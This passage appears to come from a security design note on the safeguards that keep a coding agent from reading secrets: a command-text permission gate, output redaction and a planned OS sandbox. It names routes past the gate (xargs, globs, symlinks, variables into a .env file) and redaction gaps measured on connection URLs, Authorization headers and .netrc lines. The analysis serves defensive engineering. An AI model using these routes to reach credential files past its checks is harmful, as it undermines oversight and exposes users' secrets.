  path-prefix check defeated by a symlink, and `aimed_alike`/`literal_prefix`
  are path-prefix checks.

**So Layer A is a speedbump against the obvious spelling, and treating each new
spelling as a security incident is a losing game.** Its real job is (1) catch the
direct, named attempt cheaply, and (2) at the unattended bar, refuse everything
it cannot fully account for. The R3-2 fix matters because it restored (2), not
because it closed "the" hole.

### Layer B — output redaction. Generalises across every read path.

`redact()` runs on every command's captured output, so it **does not care how the
file was read** — `cat`, `xargs`, a glob, a symlink, a variable all arrive here
identically. That is why it is worth more per unit of effort than Layer A.

Measured on a realistic `.env`, before this round's fix:

```
ANTHROPIC_API_KEY   → [redacted: anthropic key]        caught
AWS_SECRET_ACCESS…  → [redacted: high-entropy string]  caught
STRIPE_KEY          → [redacted: high-entropy string]  caught
MY_COMPANY_TOKEN    → [redacted: named secret]         caught
SESSION_SECRET      → [redacted: named secret]         caught
DATABASE_URL        → (its password, inside the URL)   SURVIVED
```

Widening to six URL shapes — `postgres`, `mongodb`, `redis`, `amqp`, an
`https://` git remote, an HTTP proxy — **all six survived**, including a `ghp_`
GitHub token, because the issuer-prefix scanner anchors at a token *start* and
the whole URL is one token. Closed by `redact_url_credentials` (RFC 3986
userinfo: syntax, not entropy, so there is no threshold to tune and an ordinary
URL is untouched). The host is kept, because which service was configured is
usually the point.

### Layer C — an OS sandbox. The only layer that can ENFORCE.

Not built. It is the only place "this file cannot be read at all" can be true,
because it operates on the filesystem rather than on text. The current landscape
(Claude Code, Codex, Cursor) converges on Seatbelt (macOS) and bubblewrap+seccomp
or Landlock (Linux). Two things worth carrying into any design here:

- **They mostly restrict WRITES and network, not reads** — Cursor's policy reads
  the broader filesystem by design. Read-restriction breaks ordinary work, which
  is the same trade-off our foreground/unattended split already makes.
- **Claude Code ships sandboxing OFF by default**, which says something about how
  much friction this layer costs in practice.

### Where hooks fit — and where they do not

A pre-execution hook sees **the same command text the permission gate sees**, so
it inherits every limit above. It cannot resolve `xargs`, a variable or a
symlink either. Hooks are the right mechanism for *site policy* ("never touch
this repo", "no network on Fridays") — a place for rules we should not be
guessing at — and the wrong mechanism for closing this class of gap.

### Measured again, after closing the URL gap (same method)

Nine more shapes through `redact()`. Seven caught: JWT, ODBC/ADO connection
string, AWS access key id, a kubeconfig token, a one-line PEM block, and both
`Authorization:` headers. An `ssh-rsa` **public** key correctly survives — it is
not a secret, and a rule that ate it would be noise.

Two did not, and one of them was worse than a miss:

```
Authorization: Bearer <token>
→ Authorization: [redacted: named secret] <token>      the SCHEME was scrubbed
```

The name-directed pass fired on `Authorization:` and scrubbed the very next
token, which is `Bearer`, leaving the credential in the clear one field to its
right. **Output that looks scrubbed and is not is worse than output that plainly
is not**, because a reader stops looking. Fixed: a scheme word is part of the
name, and the name carries across the space to the credential.

That fix took two wrong turns worth recording, both caught within a minute:
- Placed **below** the delimiter rejection it was written to precede, under a
  comment saying "checked before the rule below" — the same
  placement-not-predicate failure found in the permission engine the same day.
- Keyed on the scheme WORD alone, which redacted `before` in "rotate the token
  before Friday" — `token`, `basic` and `digest` are ordinary English. The carry
  needs the scheme's own context (was *it* named?), not just its spelling. The
  existing prose tests caught this, which is the whole argument for having them.

**Still open, deliberately:** `.netrc`'s `machine … login me password hunter2`.
The delimiter is a space, and the rule that keeps `the password is stored in
Vault` intact is the same rule that lets this through. Distinguishing them needs
either file-shape context (we are scrubbing a stream, not a named file) or a
heuristic about what a credential looks like, and a heuristic here buys a false
positive in prose for a file that is already on the seed path list. Docketed
rather than guessed at.

### Layer B's other direction, measured 2026-09-24: what the mesh catches wrongly

Every measurement above asks what Layer B *misses*. Nobody had measured what it
takes that it should not, and the answer was bad: the name-directed rule fired on
**1 line in 677** of this repo's Rust and 1 in 333 of its prose, turning
`let token = &argv[i];` into `let token = &[redacted: named secret][i];`. Its
entropy sibling, at the old 3.5 bits, had been eating two of this project's own
`SECURITY-*.md` filenames out of a `find` listing — Steven found that as a file
list short by two that read as complete, the same failure mode as the `Bearer`
scrub above, one level up.

The numbers and the fix are in §5. What belongs *here* is what it does to the
layer model:

- **Layer B's cost is not symmetric with Layer A's.** A Layer A false positive
  is a prompt: the user sees a question and answers it. A Layer B false positive
  is *silent*, lands in the text the model then reasons and edits from, and is
  indistinguishable from the file genuinely saying that. The doc used to price it
  as "a mangled build log"; for a coding agent it is mangled source.
- **Past a rate, false positives cause false negatives.** A net noisy enough to
  be noticed gets switched off, and recall goes to zero — so precision is not a
  convenience here, it is what keeps the layer switched on. This is
  [[feedback_alarm_must_vary]]'s habituation argument applied to data rather than
  to colour, and it bounds [[project_shannon_security_posture]]'s "false negatives
  are worse than false positives": true, but only below that rate.
- **The mesh size is now a knob with a published curve**, not a constant. §5 has
  it. There is no right setting — a crypto repository is full of high-entropy
  strings and a CRUD app is not — so the deliverable is the axis plus a median
  default, per [[feedback_sane_defaults_rings]].

### Layer A's remaining fail-closed is ACCIDENTAL, and that is the finding

The sibling stream-fed families are all refused today — and none of them for the
right reason:

```
tar -T filelist -c          Ask   Unaccounted(UnknownFlag)
grep -f patterns.txt .      Ask   Unaccounted(UnknownProgram)
find . -files0-from list    Ask   Unaccounted(UnknownFlag)
```

`grep` is refused because it is **unmodelled**; `tar -T` and `find -files0-from`
because the flag is unrecognised. The day someone models `grep`, or teaches
`tar` about `-T`, these open silently — the improvement removes the safety
([[feedback_enumeration_means_unmodeled]]). This is the `pkexec`/`su` shape from
R3-3, one layer over.

**The requirement, recorded where modelling happens:** a program model that adds
a flag taking a *file of operands* must mark it, so `path_indeterminate` can ask.
Not built — there is nothing to attach it to until such a flag is modelled — but
it is a precondition on that work rather than a follow-up to it.

### The ruling that falls out

1. **Stop hardening Layer A against new spellings.** Its invariant is "refuse
   what we cannot account for", and that invariant is now consistent at the
   unattended bar. A new spelling is a bug report against that invariant, not a
   security incident.
2. **Spend on Layer B**, because it covers every read path at once. The URL gap
   was the concrete one; the next question for it is what else has a *syntactic*
   shape we are not matching.
3. **Docket Layer C** as its own milestone, with its own trade-off discussion.
   It is the only layer that can make a promise rather than a speedbump, and it
   is also the one that costs the most usability.

**And say the limit out loud.** Each layer is partial; the honest posture is to
know which part each one covers, not to claim any of them is a boundary. Layer A
is a speedbump, Layer B is a net with a measurable mesh size, Layer C is a wall
we have not built.

**Amended 2026-09-24:** a mesh has two measurements and we had only taken one.
Point 2 above — "spend on Layer B, the next question is what syntactic shape we
are not matching" — was half the question, and the half we skipped was the one
already costing us. Measure a net in both directions or the number means
nothing.
